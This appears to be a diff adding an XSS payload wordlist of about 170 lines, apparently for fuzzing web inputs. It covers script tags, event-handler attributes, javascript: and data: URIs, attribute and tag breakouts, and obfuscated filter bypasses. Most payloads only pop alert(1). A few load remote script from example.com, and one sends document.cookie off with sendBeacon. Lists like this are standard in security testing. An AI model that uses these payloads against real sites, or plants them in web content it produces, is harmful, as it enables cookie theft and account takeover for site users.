@@ -1,0 +1,171 @@
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>console.log(1)</script>
+<script src=//example.com></script>
+<script src=https://example.com/x.js></script>
+<script>setTimeout(alert,1)</script>
+<script>setInterval(alert,1)</script>
+<script>location='javascript:alert(1)'</script>
+<script>top['al'+'ert'](1)</script>
+<script>self['al'+'ert'](1)</script>
+<script>window['alert'](1)</script>
+<script>Function('alert(1)')()</script>
+<script>eval('alert(1)')</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+--><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+"><body onload=alert(1)>
+'><body onload=alert(1)>
+"><iframe src=javascript:alert(1)></iframe>
+'><iframe src=javascript:alert(1)></iframe>
+"><math><mi xlink:href="data:x,<script>alert(1)</script>">
+'><math><mi xlink:href="data:x,<script>alert(1)</script>">
+<img src=x onerror=alert(1)>
+<img src=1 onerror=alert(1)>
+<img src=# onerror=alert(1)>
+<img src=/ onerror=alert(1)>
+<img src=//invalid onerror=alert(1)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(location)>
+<img src=x oneonerrorrror=alert(1) onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x to=1>
+<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
+<math><mtext><img src=x onerror=alert(1)></mtext></math>
+<math href="javascript:alert(1)">CLICK</math>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc='<img src=x onerror=alert(1)>'></iframe>
+<link rel=stylesheet href=javascript:alert(1)>
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+<base href="javascript:alert(1);//">
+<form><button formaction=javascript:alert(1)>X</button></form>
+<isindex type=image src=1 onerror=alert(1)>
+<a href=javascript:alert(1)>click</a>
+<a href="JaVaScRiPt:alert(1)">click</a>
+<a href="javascript:alert(document.domain)">click</a>
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<a id=x tabindex=1 onfocus=alert(1)>x</a>
+<button onclick=alert(1)>x</button>
+<div onclick=alert(1)>x</div>
+<div onmouseover=alert(1)>x</div>
+<div onmouseenter=alert(1)>x</div>
+<div onmouseleave=alert(1)>x</div>
+<div onmousemove=alert(1)>x</div>
+<div onwheel=alert(1)>x</div>
+<div oncontextmenu=alert(1)>x</div>
+<div onpointerover=alert(1)>x</div>
+<div onpointerenter=alert(1)>x</div>
+<div onpointerdown=alert(1)>x</div>
+<div onpointerup=alert(1)>x</div>
+<div ondrag=alert(1)>x</div>
+<div ondragstart=alert(1)>x</div>
+<div ondrop=alert(1)>x</div>
+<div oncopy=alert(1)>x</div>
+<div oncut=alert(1)>x</div>
+<div onpaste=alert(1)>x</div>
+<img src=x onload=alert(1)>
+<img src=x onabort=alert(1)>
+<img src=x onbeforeload=alert(1)>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=top['alert'](1)>
+<img src=x onerror=self['alert'](1)>
+<img src=x onerror=Function('alert(1)')()>
+<img src=x onerror=eval('alert(1)')>
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert?.(1)>
+<img src=x onerror=(alert)(1)>
+<img src=x onerror=(()=>alert(1))()>
+<img src=x onerror=location='javascript:alert(1)'>
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onclick=alert(1) x="
+' onclick=alert(1) x='
+" style=animation-name:rot onanimationstart=alert(1) x="
+' style=animation-name:rot onanimationstart=alert(1) x='
+"/><img src=x onerror=alert(1)>
+'/><img src=x onerror=alert(1)>
+"/><svg onload=alert(1)>
+'/><svg onload=alert(1)>
+"/><iframe src=javascript:alert(1)></iframe>
+'/><iframe src=javascript:alert(1)></iframe>
+javascript:alert(1)
+javascript:confirm(1)
+javascript:prompt(1)
+JaVaScRiPt:alert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:msgbox(1)
+"><a href=javascript:alert(1)>x</a>
+'><a href=javascript:alert(1)>x</a>
+<xss id=x onmouseover=alert(1)>x</xss>
+<custom-tag onmouseover=alert(1)>x</custom-tag>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<img src=x onerror=alert(atob('WA=='))>
+<img src=x onerror=alert((1).toString())>
+<img src=x onerror=alert(document['domain'])>
+<img src=x onerror=alert(document['cookie'])>
+<img src=x onerror=alert(window.location.href)>
+<img src=x onerror=fetch('/').then(r=>alert(1))>
+<img src=x onerror=navigator.sendBeacon('/x',document.cookie)>
+<script>/*xss*/alert(1)</script>
+<script>//xss
+alert(1)</script>
+<script>/**/alert(1)</script>
+<script>alert?.(1)</script>
+<script>(alert)(1)</script>
+<script>(()=>alert(1))()</script>
+<script>new Function('alert(1)')()</script>
+<script>window[atob('YWxlcnQ=')](1)</script>
+<script>this['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>frames[0]?.alert?.(1)</script>
+<img src=x onerror=alert`document.domain`>
+<img src=x onerror=alert(String.raw`xss`)>
+<img src=x onerror=alert(/xss/.source)>
+<img src=x onerror=alert([1,2,3].join())>
+<img src=x onerror=alert('xss'.toUpperCase())>
+<img src=x onerror=alert(1/**/)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(1)</script>]]></svg>
+<plaintext><script>alert(1)</script>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<!--><img src=x onerror=alert(1)>
+</title><img src=x onerror=alert(1)>
+</textarea><img src=x onerror=alert(1)>
+</style><img src=x onerror=alert(1)>
+</xmp><img src=x onerror=alert(1)>
+<script src=data:,alert(1)></script>
+<iframe src=data:text/html,<script>alert(1)</script>></iframe>
+<object data=data:text/html,<script>alert(1)</script>></object>
+<embed src=data:text/html,<script>alert(1)</script>>
+<img src=x onerror=alert(1337)>
+<svg onload=alert(1337)>
+<script>alert(1337)</script>
